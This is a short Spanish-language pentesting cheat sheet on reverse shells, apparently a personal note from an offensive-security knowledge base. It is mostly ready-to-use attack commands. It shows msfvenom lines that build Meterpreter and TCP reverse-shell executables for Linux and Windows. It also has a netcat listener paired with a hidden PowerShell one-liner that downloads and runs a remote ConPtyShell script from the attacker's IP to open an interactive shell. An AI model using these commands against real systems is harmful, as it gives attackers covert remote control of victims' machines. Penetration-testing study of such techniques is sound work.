---
aliases:
tags:
  - type/cheatsheet
primary categories:
  - "[[Penetration Test]]"
secondary categories:
  - "[[Pre-Exploitation|Pre-Explotación]]"
tertiary categories:
  - "[[Payloads]]"
type: CheatSheet
linked:
---
# Reverse Shells

***

## Cheatsheet

| **Acción**                                                                                                                                                                                                                                                                                                                                                                     | **Descripción**                                               |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------- |
| https://www.revshells.com/                                                                                                                                                                                                                                                                                                                                                     | **Generador online de reverse shells**.                       |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> -f elf -o shell LPORT=<port>`                                                                                                                                                                                                                                                                                        | **Meterpreter reverse shell** para Linux como ejecutable ELF. |
| `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe`                                                                                                                                                                                                                                                                                         | **Reverse shell TCP** para Windows como ejecutable `.exe`.    |
| En la máquina atacante:<br>[Descargar ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1)<br>`stty raw -echo; (stty size; cat) \| nc -lvnp <port>`<br><br>En la máquina de destino:<br>`powershell.exe -WindowStyle Hidden IEX(IWR http://<ip>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ip> <port>` | <br><br><br>ConPtyShell #porhacer                             |

---

## Artículos relacionados

- **MSFVenom:** Para generar payloads de reverse shell más personalizables.
    

---

## Overview

****TODO****